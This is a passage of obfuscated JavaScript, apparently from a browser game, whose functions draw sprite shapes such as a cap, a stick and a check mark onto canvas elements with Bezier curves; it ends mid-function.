		function ᐃⲆⲆⵠⲆⵠⵠ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 138 * ᐃ;
			Ⲇⵠ.height = ᐃ * 133;
			Δ.globalAlpha = ᐃΔⲆΔ ? .3 : 1;
			Δ.translate(ΔΔⵠ, ᐃ * ΔΔᐃⲆ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(26 * ᐃ, 79.640625 * ᐃ);
			Δ.bezierCurveTo(ᐃ * ᐃⵠΔᐃΔΔⲆ, 84.640625 * ᐃ, ⲆΔⵠᐃΔ * ᐃ, ᐃ * 86.640625, ᐃ * 7, ᐃ * 78.640625);
			Δ.bezierCurveTo(ᐃ * ᐃⵠⲆⵠΔ, ᐃ * 69.640625, ⲆⲆⵠⲆᐃᐃⲆ * ᐃ, 67.640625 * ᐃ, ᐃ * 31, 62.640625 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 63, ᐃ * 55.640625, ᐃ * 85, ᐃ * 57.640625, 104 * ᐃ, 63.640625 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 131, 69.640625 * ᐃ, ᐃ * 132, ᐃ * 71.640625, ᐃ * 131, 78.640625 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 131, 91.640625 * ᐃ, ᐃ * 112, 80.640625 * ᐃ, ᐃ * 91, ᐃ * 75.640625);
			Δ.bezierCurveTo(ᐃ * 51, 70.640625 * ᐃ, ᐃ * 45, ᐃ * 74.640625, ᐃ * 28, ᐃ * 78.640625);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⲆᐃᐃ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * ᐃⵠⲆᐃᐃ, ᐃ * 82.640625);
			Δ.bezierCurveTo(ᐃ * 40, ᐃ * 107.640625, 53 * ᐃ, ᐃ * 104.640625, 67 * ᐃ, 106.640625 * ᐃ);
			Δ.bezierCurveTo(101 * ᐃ, 103.640625 * ᐃ, ᐃ * 117, ᐃ * 93.640625, ᐃ * 127, 84.640625 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 135, 95.640625 * ᐃ, ᐃ * 131, 107.640625 * ᐃ, ᐃ * 110, ᐃ * 118.640625);
			Δ.bezierCurveTo(ᐃ * 78, ᐃ * 129.640625, ᐃ * 67, 130.640625 * ᐃ, 27 * ᐃ, 119.640625 * ᐃ);
			Δ.bezierCurveTo(ᐃ * ⵠⲆⲆ, 105.640625 * ᐃ, ΔᐃᐃⲆᐃ * ᐃ, 83.640625 * ᐃ, ⲆⵠⲆⵠⲆ * ᐃ, ᐃ * 84.640625);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.globalAlpha = 1;
			Δ.translate(ΔⲆⵠⲆ, -5 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆΔⲆᐃ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ΔᐃᐃⲆᐃ * ᐃ, ᐃ * 73.640625);
			Δ.bezierCurveTo(ᐃ * ⵠⵠⲆⲆⵠ, 23.640625 * ᐃ, ᐃ * 33, ᐃ * 19.640625, 71 * ᐃ, ᐃ * 17.640625);
			Δ.bezierCurveTo(ᐃ * 129, ᐃ * 19.640625, 130 * ᐃ, ᐃ * 45.640625, 130 * ᐃ, 76.640625 * ᐃ);
			Δ.bezierCurveTo(90 * ᐃ, 63.640625 * ᐃ, ᐃ * 85, 63.640625 * ᐃ, ᐃ * 73, ᐃ * 63.640625);
			Δ.bezierCurveTo(38 * ᐃ, ᐃ * 63.640625, 33 * ᐃ, ᐃ * 66.640625, ΔᐃᐃⲆᐃ * ᐃ, ᐃ * 73.640625);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[2], ΔⲆᐃⵠᐃ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔⲆΔΔ];
			Δ.lineJoin = ⵠ[ⵠⵠΔⵠ];
			Δ.moveTo(72 * ᐃ, ᐃ * 28.640625);
			Δ.bezierCurveTo(51 * ᐃ, 25.640625 * ᐃ, 56 * ᐃ, ᐃ * 7.640625, ᐃ * 70, ᐃ * 5.640625);
			Δ.bezierCurveTo(94 * ᐃ, ᐃ * 7.640625, 87 * ᐃ, ᐃ * 29.640625, ᐃ * 72, ᐃ * 28.640625);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃᐃⲆΔⵠ], Ⲇᐃ[2], ⵠΔΔᐃΔ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⲆΔⲆᐃ];
			Δ.moveTo(ᐃ * 51, ᐃ * 26.640625);
			Δ.bezierCurveTo(42 * ᐃ, 29.640625 * ᐃ, ᐃ * 43, ᐃ * 31.640625, 42 * ᐃ, ᐃ * 37.640625);
			ΔⲆ(Δ, ΔΔⵠᐃΔ, Ⲇᐃ[ⵠⵠΔⲆ], ᐃ * 4);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠΔΔ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 90, ᐃ * 26.640625);
			Δ.bezierCurveTo(ᐃ * ΔᐃⲆⲆⲆ, ᐃ * 28.640625, 98 * ᐃ, ᐃ * 34.640625, 99 * ᐃ, 38.640625 * ᐃ);
			ΔⲆ(Δ, ⵠⵠⵠⲆⵠ, Ⲇᐃ[2], ⲆⵠᐃⲆ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(26 * ᐃ, 79.640625 * ᐃ);
			Δ.bezierCurveTo(Δⵠᐃⵠⵠ * ᐃ, 84.640625 * ᐃ, ᐃ * 9, ᐃ * 86.640625, ᐃ * 7, 78.640625 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 6, 69.640625 * ᐃ, ΔⵠⵠᐃΔᐃⲆ * ᐃ, ᐃ * 67.640625, 31 * ᐃ, 62.640625 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 63, 55.640625 * ᐃ, ᐃ * 85, ᐃ * 57.640625, ᐃ * 104, ᐃ * 63.640625);
			Δ.bezierCurveTo(ᐃ * 131, 69.640625 * ᐃ, ᐃ * 132, 71.640625 * ᐃ, ᐃ * 131, ᐃ * 78.640625);
			Δ.bezierCurveTo(131 * ᐃ, ᐃ * 91.640625, 112 * ᐃ, 80.640625 * ᐃ, 91 * ᐃ, 75.640625 * ᐃ);
			Δ.bezierCurveTo(51 * ᐃ, ᐃ * 70.640625, 45 * ᐃ, 74.640625 * ᐃ, ᐃ * 28, ᐃ * 78.640625);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆΔᐃ], Ⲇᐃ[4], ᐃ * 4);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃⲆΔ];
			Δ.lineJoin = ⵠ[ΔᐃΔⲆ];
			Δ.moveTo(ⲆⲆᐃᐃⲆ * ᐃ, 82.640625 * ᐃ);
			Δ.bezierCurveTo(40 * ᐃ, 107.640625 * ᐃ, 53 * ᐃ, 104.640625 * ᐃ, 67 * ᐃ, 106.640625 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 101, 103.640625 * ᐃ, ᐃ * 117, ᐃ * 93.640625, ᐃ * 127, 84.640625 * ᐃ);
			Δ.bezierCurveTo(135 * ᐃ, ᐃ * 95.640625, 131 * ᐃ, ᐃ * 107.640625, ᐃ * 110, ᐃ * 118.640625);
			Δ.bezierCurveTo(78 * ᐃ, ᐃ * 129.640625, 67 * ᐃ, ᐃ * 130.640625, 27 * ᐃ, ᐃ * 119.640625);
			Δ.bezierCurveTo(ᐃ * 0, ᐃ * 105.640625, ᐃ * 8, ᐃ * 83.640625, ᐃ * ⲆΔΔᐃᐃ, ᐃ * 84.640625);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⲆΔⵠⵠ], Ⲇᐃ[4], ᐃ * Ⲇⵠⵠⵠ);
			return Ⲇⵠ
		}

		function ᐃΔᐃΔⵠⵠΔ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 88;
			Ⲇⵠ.height = ᐃ * 647;
			Δ.translate(ᐃ * ⵠᐃΔᐃᐃ, 20 * ᐃ);
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : 1;
			Δ.save();
			Δ.translate(45 * ᐃ, 384.5 * ᐃ);
			Ⲇᐃᐃ(Δ, ᐃ * -15, ᐃ * -216.5, 30 * ᐃ, ᐃ * 433, 10 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[Δᐃᐃⵠ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 27, ᐃ * 572);
			Δ.bezierCurveTo(44 * ᐃ, ᐃ * 580, ᐃ * 55, 576 * ᐃ, ᐃ * 62, 572 * ᐃ);
			Δ.bezierCurveTo(65 * ᐃ, ᐃ * 585.5, ᐃ * 65, 585.5 * ᐃ, 68 * ᐃ, ᐃ * 599);
			Δ.bezierCurveTo(ᐃ * 71, ᐃ * 612, 68 * ᐃ, ᐃ * 618, ᐃ * 34, 616 * ᐃ);
			Δ.bezierCurveTo(ᐃ * ⵠⵠⵠᐃᐃ, ᐃ * 615, 19 * ᐃ, ᐃ * 607, 27 * ᐃ, 573 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃΔΔ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆⲆΔⵠ];
			Δ.lineJoin = ⵠ[ᐃΔΔⲆ];
			Δ.moveTo(ᐃ * 32, ᐃ * 587);
			Δ.bezierCurveTo(39 * ᐃ, 590 * ᐃ, 48 * ᐃ, ᐃ * 588, ᐃ * 54, ᐃ * 587);
			Δ.bezierCurveTo(ᐃ * 57, ᐃ * 604, ᐃ * 59, ᐃ * 609, ᐃ * 46, 609 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 27, 609 * ᐃ, ᐃ * 28, ᐃ * 605, 33 * ᐃ, 588 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⲆⲆ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 31, ᐃ * 113);
			Δ.bezierCurveTo(27 * ᐃ, ᐃ * 139, ᐃ * 27, ᐃ * 139, 23 * ᐃ, ᐃ * 165);
			Δ.bezierCurveTo(18 * ᐃ, 187 * ᐃ, ᐃ * 39, ᐃ * 195, ᐃ * 57, ᐃ * 186);
			Δ.bezierCurveTo(ᐃ * 68, ᐃ * 180, ᐃ * 65, 171 * ᐃ, ᐃ * 62, ᐃ * 153);
			Δ.bezierCurveTo(ᐃ * 58.5, ᐃ * 131, 58.5 * ᐃ, 131 * ᐃ, ᐃ * 55, 109 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⲆⲆ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃⲆⵠⵠ];
			Δ.lineJoin = ⵠ[ΔᐃΔⲆ];
			Δ.moveTo(ᐃ * 39, 139 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 43, 139 * ᐃ, 43 * ᐃ, ᐃ * 139, 47 * ᐃ, 139 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 51, ᐃ * 158, ᐃ * 56, ᐃ * 176, ᐃ * 44, ᐃ * 175);
			Δ.bezierCurveTo(33 * ᐃ, ᐃ * 177, ᐃ * 34, 167 * ᐃ, ᐃ * 39, 140 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 44, 29 * ᐃ);
			Δ.bezierCurveTo(57 * ᐃ, ᐃ * 63, 57 * ᐃ, 63 * ᐃ, ᐃ * 70, ᐃ * 97);
			Δ.bezierCurveTo(60 * ᐃ, 111 * ᐃ, ᐃ * 60, ᐃ * 111, 50 * ᐃ, 125 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 45, 128 * ᐃ, 41 * ᐃ, 128 * ᐃ, 35 * ᐃ, ᐃ * 124);
			Δ.bezierCurveTo(26.5 * ᐃ, ᐃ * 110, 26.5 * ᐃ, ᐃ * 110, 18 * ᐃ, 96 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃⲆⵠⵠ];
			Δ.lineJoin = ⵠ[ⵠⵠΔⵠ];
			Δ.moveTo(ᐃ * 44, 54 * ᐃ);
			Δ.bezierCurveTo(50 * ᐃ, 72 * ᐃ, 50 * ᐃ, ᐃ * 72, ᐃ * 56, ᐃ * 90);
			Δ.bezierCurveTo(58 * ᐃ, ᐃ * 94, 59 * ᐃ, ᐃ * 98, ᐃ * 53, ᐃ * 105);
			Δ.bezierCurveTo(ᐃ * 47, 113 * ᐃ, 43 * ᐃ, 113 * ᐃ, ᐃ * 36, 103 * ᐃ);
			Δ.bezierCurveTo(29 * ᐃ, ᐃ * 96, 31 * ᐃ, ᐃ * 94, 35 * ᐃ, 83 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.translate(-ⵠᐃΔᐃᐃ * ᐃ, ᐃ * -ⵠⵠⵠⲆᐃ);
			Δ.globalAlpha = ⲆⵠⲆⲆ;
			Δ.save();
			Δ.translate(45 * ᐃ, 384.5 * ᐃ);
			Ⲇᐃᐃ(Δ, -ⲆⲆⵠⲆᐃᐃⲆ * ᐃ, -216.5 * ᐃ, ᐃ * 30, ᐃ * 433, ⲆⵠⲆⵠⲆ * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⲆΔ], Ⲇᐃ[Δⵠⵠⵠ], 8 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃΔΔⲆ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 27, ᐃ * 572);
			Δ.bezierCurveTo(44 * ᐃ, 580 * ᐃ, 55 * ᐃ, 576 * ᐃ, 62 * ᐃ, ᐃ * 572);
			Δ.bezierCurveTo(65 * ᐃ, 585.5 * ᐃ, ᐃ * 65, 585.5 * ᐃ, 68 * ᐃ, ᐃ * 599);
			Δ.bezierCurveTo(71 * ᐃ, 612 * ᐃ, ᐃ * 68, 618 * ᐃ, 34 * ᐃ, ᐃ * 616);
			Δ.bezierCurveTo(ᐃ * 14, ᐃ * 615, ᐃ * 19, 607 * ᐃ, 27 * ᐃ, ᐃ * 573);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[4], ᐃ * ⵠⵠᐃΔⲆ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃΔⲆ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 32, 587 * ᐃ);
			Δ.bezierCurveTo(39 * ᐃ, 590 * ᐃ, ᐃ * 48, ᐃ * 588, 54 * ᐃ, 587 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 57, 604 * ᐃ, ᐃ * 59, ᐃ * 609, 46 * ᐃ, 609 * ᐃ);
			Δ.bezierCurveTo(27 * ᐃ, 609 * ᐃ, ᐃ * 28, ᐃ * 605, 33 * ᐃ, ᐃ * 588);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[5]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆΔⲆᐃ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(31 * ᐃ, 113 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 27, 139 * ᐃ, ᐃ * 27, 139 * ᐃ, 23 * ᐃ, ᐃ * 165);
			Δ.bezierCurveTo(ᐃ * 18, ᐃ * 187, ᐃ * 39, ᐃ * 195, 57 * ᐃ, ᐃ * 186);
			Δ.bezierCurveTo(68 * ᐃ, ᐃ * 180, ᐃ * 65, 171 * ᐃ, 62 * ᐃ, ᐃ * 153);
			Δ.bezierCurveTo(ᐃ * 58.5, 131 * ᐃ, ᐃ * 58.5, ᐃ * 131, ᐃ * 55, ᐃ * 109);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[4], ᐃ * ⵠⵠⲆⵠΔ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔⲆΔΔ];
			Δ.lineJoin = ⵠ[ⲆⲆΔⵠ];
			Δ.moveTo(ᐃ * 39, ᐃ * 139);
			Δ.bezierCurveTo(43 * ᐃ, 139 * ᐃ, 43 * ᐃ, 139 * ᐃ, 47 * ᐃ, 139 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 51, 158 * ᐃ, 56 * ᐃ, 176 * ᐃ, 44 * ᐃ, 175 * ᐃ);
			Δ.bezierCurveTo(33 * ᐃ, 177 * ᐃ, ᐃ * 34, 167 * ᐃ, ᐃ * 39, ᐃ * 140);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⲆⲆΔⵠ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 44, ᐃ * 29);
			Δ.bezierCurveTo(57 * ᐃ, 63 * ᐃ, ᐃ * 57, 63 * ᐃ, ᐃ * 70, ᐃ * 97);
			Δ.bezierCurveTo(ᐃ * 60, ᐃ * 111, 60 * ᐃ, 111 * ᐃ, 50 * ᐃ, 125 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 45, 128 * ᐃ, 41 * ᐃ, ᐃ * 128, 35 * ᐃ, 124 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 26.5, 110 * ᐃ, ᐃ * 26.5, ᐃ * 110, ᐃ * ⲆⵠΔⵠⵠ, ᐃ * 96);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⲆᐃⲆΔΔ], Ⲇᐃ[7], 8 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠᐃⵠ];
			Δ.lineJoin = ⵠ[ⵠⲆⵠⵠ];
			Δ.moveTo(ᐃ * 44, ᐃ * 54);
			Δ.bezierCurveTo(50 * ᐃ, 72 * ᐃ, 50 * ᐃ, 72 * ᐃ, 56 * ᐃ, ᐃ * 90);
			Δ.bezierCurveTo(ᐃ * 58, 94 * ᐃ, 59 * ᐃ, 98 * ᐃ, ᐃ * 53, ᐃ * 105);
			Δ.bezierCurveTo(ᐃ * 47, 113 * ᐃ, 43 * ᐃ, ᐃ * 113, ᐃ * 36, ᐃ * 103);
			Δ.bezierCurveTo(29 * ᐃ, 96 * ᐃ, 31 * ᐃ, 94 * ᐃ, 35 * ᐃ, ᐃ * 83);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⲆⲆΔΔ]);
			return Ⲇⵠ
		}

		function ⵠⵠΔΔΔΔⲆⵠⵠ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 200 * ᐃ;
			Ⲇⵠ.height = ᐃ * 200;
			Δ.save();
			Δ.translate(ᐃ * 112, ᐃ * 158);
			Ⲇᐃᐃ(Δ, ᐃ * -86.5, -86 * ᐃ, ᐃ * 150, 35 * ᐃ, ⵠΔΔⲆⲆ * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.save();
			Δ.translate(ᐃ * 170, ᐃ * 100);
			Ⲇᐃᐃ(Δ, ᐃ * -86.5, -86 * ᐃ, ᐃ * 35, 150 * ᐃ, ᐃ * ⵠᐃΔᐃᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			return Ⲇⵠ
		}

		function ᐃⵠΔⵠⲆⲆΔᐃⲆ(ᐃ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 60;
			Ⲇⵠ.height = 60 * ᐃ;
			Δ.translate(-25 * ᐃ, -25 * ᐃ);
			Δ.translate(0, ᐃ * 5);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃΔΔΔ];
			Δ.lineJoin = ⵠ[ⵠᐃΔⲆ];
			Δ.moveTo(24 * ᐃ, ᐃ * 50);
			Δ.bezierCurveTo(32.5 * ᐃ, ᐃ * 54.5, 32.5 * ᐃ, 54.5 * ᐃ, 41 * ᐃ, 59 * ᐃ);
			Δ.bezierCurveTo(57 * ᐃ, 47 * ᐃ, 57 * ᐃ, 47 * ᐃ, ᐃ * 73, ᐃ * 35);
			Δ.bezierCurveTo(57 * ᐃ, 53 * ᐃ, ᐃ * 57, 53 * ᐃ, ᐃ * 41, 71 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.translate(ΔⲆⵠⲆ, ᐃ * -5);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆΔⲆᐃ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(24 * ᐃ, ᐃ * 50);
			Δ.bezierCurveTo(ᐃ * 32.5, 54.5 * ᐃ, 32.5 * ᐃ, ᐃ * 54.5, ᐃ * 41, ᐃ * 59);
			Δ.bezierCurveTo(57 * ᐃ, 47 * ᐃ, 57 * ᐃ, 47 * ᐃ, ᐃ * 73, 35 * ᐃ);
			Δ.bezierCurveTo(57 * ᐃ, 53 * ᐃ, ᐃ * 57, 53 * ᐃ, 41 * ᐃ, ᐃ * 71);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔᐃⲆⵠ]);
			return Ⲇⵠ
		}

		function ᐃᐃⲆᐃᐃᐃᐃ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 165;
			Ⲇⵠ.height = ᐃ * 123;
			Δ.save();
			Δ.translate(81 * ᐃ, ᐃ * 65);
			Ⲇᐃᐃ(Δ, -78 * ᐃ, ᐃ * -54.5, 156 * ᐃ, 109 * ᐃ, 20 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆⲆ]);
			Δ.save();
			Δ.translate(81 * ᐃ, ᐃ * 58);
			Ⲇᐃᐃ(Δ, ᐃ * -78, ᐃ * -54.5, ᐃ * 156, 109 * ᐃ, ᐃ * 20);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[Δⵠⵠⵠ], ⵠⵠΔᐃΔ);
			Δ.save();
			Δ.translate(ᐃ * 81, 58 * ᐃ);
			Ⲇᐃᐃ(Δ, ᐃ * -69, ᐃ * -47, ᐃ * 138, 93 * ᐃ, 15 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[ⲆⵠᐃΔ], ᐃⵠⵠΔ);
			Δ.save();
			Δ.translate(79 * ᐃ, 54 * ᐃ);
			Ⲇᐃᐃ(Δ, -34 * ᐃ, ᐃ * -40, 68 * ᐃ, 88 * ᐃ, 13 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, undefined, Ⲇᐃ[5], 4);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠᐃΔⵠ];
			Δ.moveTo(ᐃ * 44, ⵠΔΔⲆΔΔΔ * ᐃ);
			Δ.bezierCurveTo(ᐃ * 43.5, 55 * ᐃ, 43.5 * ᐃ, ᐃ * 55, 43 * ᐃ, ᐃ * 101);
			Δ.closePath();
			ΔⲆ(Δ, ⲆΔΔΔⲆ, Ⲇᐃ[Δⵠᐃᐃⵠ], 4);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠΔⵠ];
			Δ.lineJoin = ⵠ[ᐃΔΔⲆ];
			Δ.moveTo(ᐃ * 115, ᐃ * 13);
			Δ.bezierCurveTo(ᐃ * 115, 56 * ᐃ, ᐃ * 115, 56 * ᐃ, ᐃ * 115, 101 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, undefined, Ⲇᐃ[6], 4);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠⲆᐃᐃ];
			Δ.moveTo(35 * ᐃ, ᐃ * ᐃⵠⵠⲆⵠ);
			Δ.bezierCurveTo(ᐃ * 35, ᐃ * 56, 36 * ᐃ, 109 * ᐃ, ᐃ * 35, 110 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, undefined, Ⲇᐃ[ⵠΔᐃⵠⵠ], 4);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 123, ᐃ * 6);
			Δ.bezierCurveTo(ᐃ * 123, ᐃ * 56, 123 * ᐃ, ᐃ * 56, ᐃ * 123, 110 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, ΔⵠⲆᐃΔ, Ⲇᐃ[7], ΔⲆᐃⵠᐃ);
			Δ.save();
			Δ.translate(79 * ᐃ, ᐃ * 113);
			Ⲇᐃᐃ(Δ, -18 * ᐃ, -ΔⵠⵠΔ * ᐃ, 36 * ᐃ, ᐃ * ⲆⵠᐃΔ, ᐃΔⲆⵠᐃ * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, ⵠᐃⵠⲆΔ, Ⲇᐃ[ⲆⵠⵠⲆΔ], 4);
			Δ.save();
			Δ.translate(ᐃ * 75, ᐃ * 118);
			Ⲇᐃᐃ(Δ, -6 * ᐃ, ᐃ * -2.5, 20 * ᐃ, ⵠⵠΔΔ * ᐃ, ᐃ * ⵠΔΔⲆⲆ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ⲆᐃΔⲆⵠ]);
			return Ⲇⵠ
		}

		function ΔⵠⲆᐃΔᐃΔⲆⵠ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 118;
			Ⲇⵠ.height = 129 * ᐃ;
			Δ.save();
			Δ.translate(ᐃ * 90, ᐃ * 90);
			Ⲇᐃᐃ(Δ, ᐃ * -86.5, ᐃ * -86, 110 * ᐃ, ᐃ * 110, ᐃ * 15);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[1], 4);
			Δ.save();
			Ⲇᐃᐃ(Δ, ᐃ * 30, 115 * ᐃ, 60 * ᐃ, ᐃ * 5, ⵠᐃⵠΔⲆⵠⵠ * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[Ⲇⵠⵠᐃ], Ⲇᐃ[ᐃᐃⵠⲆᐃ], 4);
			Δ.save();
			Ⲇᐃᐃ(Δ, ᐃ * 50, 117 * ᐃ, ᐃΔᐃⲆⵠ * ᐃ, ᐃ * ⵠᐃⲆⲆΔ, ⲆᐃⲆΔⲆ * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[2]);
			return Ⲇⵠ
		}

		function ΔᐃⵠΔᐃᐃⲆ(ᐃ, ⵠΔᐃΔΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 92 * ᐃ;
			Ⲇⵠ.height = 108 * ᐃ;
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ΔⲆΔΔ];
			Δ.moveTo(ᐃ * 31, 10 * ᐃ);
			Δ.bezierCurveTo(37 * ᐃ, 2 * ᐃ, ᐃ * 49, ᐃ * 0, 61 * ᐃ, ᐃ * ᐃᐃⵠΔⲆⵠᐃ);
			Δ.bezierCurveTo(ᐃ * 81, ᐃ * 31, ᐃ * 78, ᐃ * 25, ᐃ * 79, 37 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 76, ᐃ * 44, ᐃ * 81, ᐃ * 56, ᐃ * 85, ᐃ * 63);
			Δ.bezierCurveTo(91 * ᐃ, ᐃ * 71, ᐃ * 90, ᐃ * 78, 83 * ᐃ, ᐃ * 84);
			Δ.bezierCurveTo(60 * ᐃ, ᐃ * 98, ᐃ * 67, 95 * ᐃ, 57 * ᐃ, ᐃ * 102);
			Δ.bezierCurveTo(47 * ᐃ, ᐃ * 106, 43 * ᐃ, ᐃ * 106, 31 * ᐃ, 98 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 22, 91 * ᐃ, ᐃ * 17, ᐃ * 89, ᐃⵠⵠⵠΔ * ᐃ, 84 * ᐃ);
